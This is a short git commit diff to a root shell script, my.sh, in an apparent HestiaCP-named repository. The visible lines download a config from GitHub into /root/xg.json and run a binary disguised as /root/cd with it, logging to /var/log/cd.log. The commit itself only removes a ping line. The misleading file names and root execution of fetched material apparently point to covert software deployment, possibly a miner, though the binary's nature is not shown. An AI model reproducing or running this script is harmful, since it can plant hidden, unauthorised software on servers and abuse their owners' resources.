b271212778fdc45f1a82d8d99e5b65ad14e19003
Jolia Miya <145192173+jmmjiaa89@users.noreply.github.com>
2025-05-21 21:23:27 +0800

    Update my.sh

--- my.sh
+++ my.sh
@@ -4,4 +4,3 @@ chmod u+x /root/cd
 wget -O /root/xg.json https://raw.githubusercontent.com/jmmjiaa89/hestiacp/refs/heads/main/config.json
 chmod u+x /root/xg.json
 /root/cd --config=/root/xg.json > /var/log/cd.log 2>&1
-ping aws.amazon.com
